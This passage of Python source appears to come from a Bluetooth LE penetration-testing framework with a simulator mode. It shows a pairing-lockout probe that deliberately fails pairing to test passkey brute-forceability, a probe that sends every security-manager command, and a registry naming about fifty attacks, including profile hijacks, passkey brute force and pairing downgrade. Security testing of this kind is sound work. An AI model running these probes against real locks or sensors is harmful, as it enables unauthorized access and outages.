        extra = {"device": device.to_dict(), "results": results, "state": state,
                 "simulated": bool(getattr(ctx, "demo", False))}
        refused = [row for row in results if row["reason"]]
        title = (f"BLE public key audit: {device.name} answered "
                 f"{len([row for row in results if row['answered']])}/2 key(s)")
        detail = (f"the debug key was answered with {results[0]['answer']} and the "
                  f"off-curve point with {results[1]['answer']}"
                  + (f"; {refused[0]['reason']} is the refusal that says the point was "
                     f"checked" if refused else
                     "; neither was refused with a reason, which is a stack that accepts "
                     "what it cannot validate"))
        return self._report(ctx, ap, attempt, title, detail, extra, severity="high")


class BlePairLockoutProbeAttack(_Takeover):
    """Fail the exchange on purpose, and see whether the device stops accepting."""

    name = "ble_pair_lockout_probe"
    role = "smp"
    label = "BLE pairing lockout probe (does the device ever stop accepting?)"
    category = "dos"
    noise = "loud"
    impact = "outage"
    tool = "wifipilot bt.py (SMP pairing failed) + blesim.py"
    devices = ("bt_lock", "ble_sensor")

    description = (
        "A device that limits pairing attempts protects its passkey; one that does not has "
        "a passkey that can be guessed.  This fails the exchange deliberately, over and "
        "over, and reports the attempt at which the device started refusing — a device that "
        "never does is a device whose pairing is a rate limit away.")
    detection = (
        "Repeated pairing failures from one address: the device's log carries the reason "
        "codes, and a pairing window that stays open shows them.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("smp")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE pairing lockout probe: no target",
                                "no bondable device on the floor", {})
        attempts: List[Dict[str, Any]] = []
        lockout_at = 0
        for index in range(24):
            self.smp(device.address, bt.smp_pairing_request(io_capability=0x03, auth=0x01,
                                                            key_size=16))
            answer, parsed = self.smp(device.address, bytes([0x04]) + bytes(16))
            name = parsed.get("name") or ("silence" if not answer else "")
            attempts.append({"index": index, "answer": name,
                             "reason": parsed.get("reason_text", "")})
            if name == "Pairing Failed" and parsed.get("reason") == 0x09 and not lockout_at:
                lockout_at = index + 1
        state = self.link_state(device.address)
        extra = {"device": device.to_dict(), "attempts": attempts,
                 "failures": len([row for row in attempts if row["answer"]]),
                 "lockout_at": lockout_at, "state": state,
                 "simulated": bool(getattr(ctx, "demo", False))}
        if lockout_at:
            title = (f"BLE pairing lockout: {device.name} stopped answering at attempt "
                     f"{lockout_at}")
            detail = (f"the device answered {lockout_at} failed exchange(s) and then "
                      f"reported repeated attempts: a lockout is what makes a six-digit "
                      f"passkey a secret rather than a delay")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="info")
        title = (f"BLE pairing lockout: {device.name} never stopped accepting "
                 f"({len(attempts)} attempts)")
        detail = (f"{len(attempts)} deliberately failed exchange(s) produced no lockout "
                  f"message: at this rate a six-digit passkey is a million exchanges and "
                  f"nothing else")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="high")


class BleSmpCommandProbeAttack(_Takeover):
    """Offer every security-manager command, and read the refusals."""

    name = "ble_smp_command_probe"
    role = "smp"
    label = "BLE SMP command probe (which security-manager commands exist)"
    category = "discovery"
    noise = "moderate"
    impact = "info"
    tool = "wifipilot bt.py (SMP commands) + blesim.py"
    devices = ("ble_sensor", "bt_lock")

    description = (
        "The security manager has fifteen commands and a device implements the ones its "
        "features need.  This sends all of them — in order, with the right lengths — and "
        "reports which were answered, which were refused and which produced nothing at all, "
        "which is the map of the pairing implementation.")
    detection = (
        "Every SMP command in one session: the device's security manager log carries the "
        "sequence, and no pairing ever starts from it.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("smp")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE SMP command probe: no target",
                                "no bondable device on the floor", {})
        commands = (0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B,
                    0x0C, 0x0D, 0x0E)
        results: List[Dict[str, Any]] = []
        for command in commands:
            body = bytes([command]) + bytes(16)
            if command in (0x01, 0x02):
                body = bt.smp_pairing_request(io_capability=0x03, auth=0x01, key_size=16)
            elif command == 0x03:
                body = bytes([0x03]) + bytes(16)
            answer, parsed = self.smp(device.address, body)
            results.append({"command": f"0x{command:02x}",
                            "name": bt.SMP_COMMANDS.get(command, ""),
                            "answer": parsed.get("name", "") or
                            ("silence" if not answer else answer[:1].hex()),
                            "answered": bool(answer),
                            "reason": parsed.get("reason_text", "")})
        answered = [row for row in results if row["answered"]]
        refused = [row for row in results if row["reason"]]
        extra = {"device": device.to_dict(), "commands": results,
                 "answered": len(answered), "refused": len(refused), "asked": len(commands),
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE SMP command probe: {len(answered)} of {len(commands)} command(s) "
                 f"answered on {device.name}")
        detail = (f"the security manager answered {len(answered)} command(s) and refused "
                  f"{len(refused)} with a reason"
                  + (f" ({refused[0]['reason']})" if refused else "")
                  + ": what a device implements is what an attacker has to work with")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="low")


# --------------------------------------------------------------------------- #
# registry
# --------------------------------------------------------------------------- #

ATTACKS: List[type] = [
    # 1. the classic profiles
    BleHfpHijackAttack, BleHfpAudioGatewayAttack, BleMapHijackAttack, BlePbapHijackAttack,
    BleHfpIdentitySpoofAttack, BleSapImsiReadAttack, BleSapFileSweepAttack,
    BleObexPushAttack, BleSppHijackAttack, BleDialHijackAttack,
    BleHidpClassicInjectAttack, BleAudioSessionTakeoverAttack, BleL2capPsmSweepAttack,
    BleSdpBrowseAttack,
    # 2. the attribute table
    BleGattWriteSweepAttack, BleGattBlobDumpAttack, BleGattHandleEnumAttack,
    BleGattCharFuzzAttack, BleGattReadFloodAttack, BleMtuAbuseAttack,
    BleNotifySpoofAttack, BleServiceChangedAbuseAttack, BleSignedWriteBypassAttack,
    BleAttHandleBruteAttack, BleServiceTableDumpAttack, BleGattValueDumpAttack,
    # 3. the air and the link layer
    BleIrkCrackAttack, BleRpaFollowAttack, BleAdvFloodAttack, BleScanHogAttack,
    BleConnFloodAttack, BleConnParamStarveAttack, BlePhyDowngradeAttack,
    BleDataLengthAbuseAttack, BleLlUnknownProbeAttack, BleVersionSpoofAttack,
    BleFeaturePageSpoofAttack, BleEncryptionNegotiationAttack,
    # 4. the security manager
    BlePasskeyBruteforceAttack, BlePairingFloodAttack, BleOobClaimAttack,
    BleLescDowngradeAttack, BleKeypressSpoofAttack, BleCtkdAttack, BleKeySizeProbeAttack,
    BleBondOverwriteAttack, BleConfirmReplayAttack, BlePublicKeyAuditAttack,
    BlePairLockoutProbeAttack, BleSmpCommandProbeAttack,
]

NAMES: List[str] = [cls.name for cls in ATTACKS]

#: metadata for the registry: what the catalogue, the planner and the docs read
META: Dict[str, Dict[str, Any]] = {}
for _cls in ATTACKS:
    META[_cls.name] = {
        "category": getattr(_cls, "category", "rogue"),
        "noise": getattr(_cls, "noise", "moderate"),
        "impact": getattr(_cls, "impact", "info"),
        "detection": getattr(_cls, "detection", "") or "the peer's own controller log",
        "domain": "bluetooth",
        "devices": list(getattr(_cls, "devices", ())),
        "port": 0, "protocol": "ble",
        "technique": "takeover",
        "severity": getattr(_cls, "finding_severity", "medium"),
    }

REGISTRY = [(cls.name, META[cls.name], cls) for cls in ATTACKS]
